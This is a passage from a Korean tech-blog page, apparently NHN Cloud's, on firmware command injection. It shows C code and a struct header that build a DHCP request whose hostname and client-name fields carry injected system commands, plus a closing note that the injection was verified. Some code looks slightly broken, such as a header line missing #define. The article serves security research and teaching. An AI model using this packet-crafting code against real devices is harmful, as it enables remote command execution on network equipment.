<span class="line">    boost_custom_p<span class="token operator">-&gt;</span>parameter_request_list_item_252_private_proxy_autodiscovery <span class="token operator">=</span> <span class="token number">0xfc</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"><span class="token keyword">void</span> <span class="token function">set_mac_address</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">boost_custom</span> <span class="token operator">*</span> boost_custom_o<span class="token punctuation">)</span></span>
<span class="line"><span class="token punctuation">{</span></span>
<span class="line">    DWORD size <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>PIP_ADAPTER_INFO<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    PIP_ADAPTER_INFO Info<span class="token punctuation">;</span></span>
<span class="line">    <span class="token function">ZeroMemory</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Info<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token function">GetAdaptersInfo</span><span class="token punctuation">(</span>Info<span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token keyword">if</span> <span class="token punctuation">(</span>result <span class="token operator">==</span> ERROR_BUFFER_OVERFLOW<span class="token punctuation">)</span></span>
<span class="line">    <span class="token punctuation">{</span></span>
<span class="line">        Info <span class="token operator">=</span> <span class="token punctuation">(</span>PIP_ADAPTER_INFO<span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">        <span class="token function">GetAdaptersInfo</span><span class="token punctuation">(</span>Info<span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line">    <span class="token keyword">do</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token keyword">if</span> <span class="token punctuation">(</span>Info<span class="token operator">-&gt;</span>GatewayList<span class="token punctuation">.</span>IpAddress<span class="token punctuation">.</span>String<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">&#39;0&#39;</span><span class="token punctuation">)</span></span>
<span class="line">        <span class="token punctuation">{</span></span>
<span class="line">            Info <span class="token operator">=</span> Info<span class="token operator">-&gt;</span>Next<span class="token punctuation">;</span></span>
<span class="line">        <span class="token punctuation">}</span></span>
<span class="line">        <span class="token keyword">else</span></span>
<span class="line">        <span class="token punctuation">{</span></span>
<span class="line">            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span> <span class="token number">6</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span></span>
<span class="line">            <span class="token punctuation">{</span></span>
<span class="line">                boost_custom_o<span class="token operator">-&gt;</span>Client_MAC_address<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> Info<span class="token operator">-&gt;</span>Address<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line">                boost_custom_o<span class="token operator">-&gt;</span>Client_MAC_address61<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> Info<span class="token operator">-&gt;</span>Address<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line">            <span class="token punctuation">}</span></span>
<span class="line">            <span class="token keyword">break</span><span class="token punctuation">;</span></span>
<span class="line">        <span class="token punctuation">}</span></span>
<span class="line">    <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>Info<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"><span class="token keyword">void</span> <span class="token function">set_ip_address</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">boost_custom</span> <span class="token operator">*</span> boost_custom_o<span class="token punctuation">)</span></span>
<span class="line"><span class="token punctuation">{</span></span>
<span class="line">    <span class="token keyword">int</span> ip_addr<span class="token punctuation">;</span></span>
<span class="line">    <span class="token keyword">char</span> <span class="token operator">*</span> ip_addr_temp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span> ip_addr<span class="token punctuation">;</span></span>
<span class="line">    DWORD size <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>PIP_ADAPTER_INFO<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    PIP_ADAPTER_INFO Info<span class="token punctuation">;</span></span>
<span class="line">    <span class="token function">ZeroMemory</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Info<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token function">GetAdaptersInfo</span><span class="token punctuation">(</span>Info<span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token keyword">if</span> <span class="token punctuation">(</span>result <span class="token operator">==</span> ERROR_BUFFER_OVERFLOW<span class="token punctuation">)</span></span>
<span class="line">    <span class="token punctuation">{</span></span>
<span class="line">        Info <span class="token operator">=</span> <span class="token punctuation">(</span>PIP_ADAPTER_INFO<span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">        <span class="token function">GetAdaptersInfo</span><span class="token punctuation">(</span>Info<span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line">    <span class="token keyword">do</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token keyword">if</span> <span class="token punctuation">(</span>Info<span class="token operator">-&gt;</span>GatewayList<span class="token punctuation">.</span>IpAddress<span class="token punctuation">.</span>String<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">&#39;0&#39;</span><span class="token punctuation">)</span></span>
<span class="line">        <span class="token punctuation">{</span></span>
<span class="line">            Info <span class="token operator">=</span> Info<span class="token operator">-&gt;</span>Next<span class="token punctuation">;</span></span>
<span class="line">        <span class="token punctuation">}</span></span>
<span class="line">        <span class="token keyword">else</span></span>
<span class="line">        <span class="token punctuation">{</span></span>
<span class="line">            ip_addr <span class="token operator">=</span> <span class="token function">inet_addr</span><span class="token punctuation">(</span>Info<span class="token operator">-&gt;</span>IpAddressList<span class="token punctuation">.</span>IpAddress<span class="token punctuation">.</span>String<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span></span>
<span class="line">                boost_custom_o<span class="token operator">-&gt;</span>requested_ip_addres50<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> ip_addr_temp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line">            <span class="token keyword">break</span><span class="token punctuation">;</span></span>
<span class="line">        <span class="token punctuation">}</span></span>
<span class="line">    <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>Info<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"><span class="token keyword">void</span> <span class="token function">set_injection_code</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">boost_custom</span> <span class="token operator">*</span> boost_custom_o<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span> injection_code<span class="token punctuation">,</span> <span class="token keyword">int</span> injection_code_size<span class="token punctuation">)</span></span>
<span class="line"><span class="token punctuation">{</span></span>
<span class="line">    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>boost_custom_o<span class="token operator">-&gt;</span>host_name12<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> NAMESIZE<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>boost_custom_o<span class="token operator">-&gt;</span>client_name81<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> NAMESIZE<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span> injection_code_size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token punctuation">{</span></span>
<span class="line">        boost_custom_o<span class="token operator">-&gt;</span>host_name12<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> injection_code<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line">        boost_custom_o<span class="token operator">-&gt;</span>client_name81<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> injection_code<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="dhcp-req-h" tabindex="-1"><a class="header-anchor" href="#dhcp-req-h"><span>dhcp_req.h</span></a></h3><div class="language-h line-numbers-mode" data-highlighter="prismjs" data-ext="h"><pre><code class="language-h"><span class="line">NAMESIZE 12</span>
<span class="line">struct boost_custom {</span>
<span class="line">    char Message_type;</span>
<span class="line">    char Hardware_type;</span>
<span class="line">    char Hardware_address_length;</span>
<span class="line">    char Hops;</span>
<span class="line">    int Transaction_ID;</span>
<span class="line">    short Seconds_elapsed;</span>
<span class="line">    short Bootp_flags;</span>
<span class="line">    int Client_IP_address;</span>
<span class="line">    int Your_client_IP_address;</span>
<span class="line">    int Next_server_IP_address;</span>
<span class="line">    int Relay_agent_IP_address;</span>
<span class="line">    char Client_MAC_address[6];</span>
<span class="line">    char Client_hardware_address_padding[10];</span>
<span class="line">    char Server_host_name_not_given[64];</span>
<span class="line">    char Boot_file_name_not_given[128];</span>
<span class="line">    int Magic_cookie;</span>
<span class="line">    struct Option32 {</span>
<span class="line">        char Option_type32;</span>
<span class="line">        char Option_length32;</span>
<span class="line">        char DHCP_Request32;</span>
<span class="line">    };</span>
<span class="line">    struct Option61 {</span>
<span class="line">        char Option_type61;</span>
<span class="line">        char Option_length61;</span>
<span class="line">        char Hardware_type_Ethernet61;</span>
<span class="line">        char Client_MAC_address61[6];</span>
<span class="line">    };</span>
<span class="line">    struct option50 {</span>
<span class="line">        char option_type50;</span>
<span class="line">        char option_length50;</span>
<span class="line">        char requested_ip_addres50[4];</span>
<span class="line">    };</span>
<span class="line">    struct option12 {</span>
<span class="line">        char option_type12;</span>
<span class="line">        char option_length12;</span>
<span class="line">        char host_name12[NAMESIZE];</span>
<span class="line">    };</span>
<span class="line">    struct option81 {</span>
<span class="line">        char option_type81;</span>
<span class="line">        char option_length81;</span>
<span class="line">        char flags81;</span>
<span class="line">        char a_rr_result81;</span>
<span class="line">        char ptr_rr_result81;</span>
<span class="line">        char client_name81[NAMESIZE];</span>
<span class="line">    };</span>
<span class="line">    struct option60 {</span>
<span class="line">        char option_type60;</span>
<span class="line">        char option_length60;</span>
<span class="line">        char vendor_class_identifier_msft60[8];</span>
<span class="line">    };</span>
<span class="line">    struct option55 {</span>
<span class="line">        char option_type55;</span>
<span class="line">        char option_length55;</span>
<span class="line">        char parameter_request_list_item_1_subnet_mask;</span>
<span class="line">        char parameter_request_list_item_3_router;</span>
<span class="line">        char parameter_request_list_item_6_domain_name_server;</span>
<span class="line">        char parameter_request_list_item_15_domain_name;</span>
<span class="line">        char parameter_request_list_item_31_perform_router_discover;</span>
<span class="line">        char parameter_request_list_item_33_static_route;</span>
<span class="line">        char parameter_request_list_item_43_vendor_specific_information;</span>
<span class="line">        char parameter_request_list_item_44_netbios_over_tcp_ip_name_server;</span>
<span class="line">        char parameter_request_list_item_46_netbios_over_tcp_ip_node_type;</span>
<span class="line">        char parameter_request_list_item_47_netbios_over_tcp_ip_scope;</span>
<span class="line">        char parameter_request_list_item_121_classless_static_route;</span>
<span class="line">        char parameter_request_list_item_249_private_classless_static_route_microsoft;</span>
<span class="line">        char parameter_request_list_item_252_private_proxy_autodiscovery;</span>
<span class="line">    };</span>
<span class="line">    char option255;</span>
<span class="line">    char padding_00;</span>
<span class="line">};</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>조작 프로그램을 이용해 DHCP request 패킷의 Hostname을 시스템 명령어로 변조하면 System 명령어를 수행시킬 수 있습니다. 이와 같이 command Injection이 검증되었습니다.</p><figure><img src="https://image.toast.com/aaaadh/real/2023/techblog/fci8.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>긴 글을 읽어 주셔서 감사합니다.</p>`,15))])}const A=d(g,[["render",w]]),q=JSON.parse('{"path":"/meetup.nhncloud.com/376.html","title":"Firmware Command Injection을 알아보자!","lang":"ko-KR","frontmatter":{"lang":"ko-KR","title":"Firmware Command Injection을 알아보자!","description":"Article(s) > Firmware Command Injection을 알아보자!","icon":"iconfont icon-c","category":["C","Article(s)"],"tag":["blog","meetup.nhncloud.com","c"],"head":[["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"Firmware Command Injection을 알아보자!\\",\\"image\\":[\\"https://image.toast.com/aaaadh/real/2023/techblog/NHNuD074uB77CuC6B0uB4DC%20MeetupFirmware%20Command%20InjectionuC744%20uC54CuC544uBCF4uC790uC12CuB124uC77C231128.jpg\\",\\"https://image.toast.com/aaaadh/real/2023/techblog/table1uB300uC9C0%201.png\\",\\"https://image.toast.com/aaaadh/real/2023/techblog/fci1%281%29.png\\",\\"https://image.toast.com/aaaadh/real/2023/techblog/fci2.png\\",\\"https://image.toast.com/aaaadh/real/2023/techblog/fci3.png\\",\\"https://image.toast.com/aaaadh/real/2023/techblog/table2uB300uC9C0%201.png\\",\\"https://image.toast.com/aaaadh/real/2023/techblog/fci4.png\\",\\"https://image.toast.com/aaaadh/real/2023/techblog/fci5.png\\",\\"https://image.toast.com/aaaadh/real/2023/techblog/fci6.png\\",\\"https://image.toast.com/aaaadh/real/2023/techblog/fci7uB300uC9C0%201.png\\",\\"https://image.toast.com/aaaadh/real/2023/techblog/fci8.png\\"],\\"datePublished\\":\\"2023-12-04T00:00:00.000Z\\",\\"dateModified\\":null,\\"author\\":[]}"],["meta",{"property":"og:url","content":"https://chanhi2000.github.io/bookshelf/meetup.nhncloud.com/376.html"}],["meta",{"property":"og:site_name","content":"📚Bookshelf"}],["meta",{"property":"og:title","content":"Firmware Command Injection을 알아보자!"}],["meta",{"property":"og:description","content":"Article(s) > Firmware Command Injection을 알아보자!"}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"https://image.toast.com/aaaadh/real/2023/techblog/NHNuD074uB77CuC6B0uB4DC%20MeetupFirmware%20Command%20InjectionuC744%20uC54CuC544uBCF4uC790uC12CuB124uC77C231128.jpg"}],["meta",{"property":"og:locale","content":"ko-KR"}],["meta",{"name":"twitter:card","content":"summary_large_image"}],["meta",{"name":"twitter:image:src","content":"https://image.toast.com/aaaadh/real/2023/techblog/NHNuD074uB77CuC6B0uB4DC%20MeetupFirmware%20Command%20InjectionuC744%20uC54CuC544uBCF4uC790uC12CuB124uC77C231128.jpg"}],["meta",{"name":"twitter:image:alt","content":"Firmware Command Injection을 알아보자!"}],["meta",{"property":"article:tag","content":"c"}],["meta",{"property":"article:tag","content":"meetup.nhncloud.com"}],["meta",{"property":"article:tag","content":"blog"}],["meta",{"property":"article:published_time","content":"2023-12-04T00:00:00.000Z"}],[{"meta":null},{"property":"og:title","content":"Article(s) > Firmware Command Injection을 알아보자!"},{"property":"og:description","content":"Firmware Command Injection을 알아보자!"},{"property":"og:url","content":"https://chanhi2000.github.io/bookshelf/meetup.nhncloud.com/376.html"}]],"prev":"/programming/c/articles/README.md","date":"2023-12-04T00:00:00.000Z","isOriginal":false,"cover":"https://image.toast.com/aaaadh/real/2023/techblog/NHNuD074uB77CuC6B0uB4DC%20MeetupFirmware%20Command%20InjectionuC744%20uC54CuC544uBCF4uC790uC12CuB124uC77C231128.jpg"},"git":{},"readingTime":{"minutes":3.08,"words":925},"filePathRelative":"meetup.nhncloud.com/376.md"}');export{A as comp,q as data};
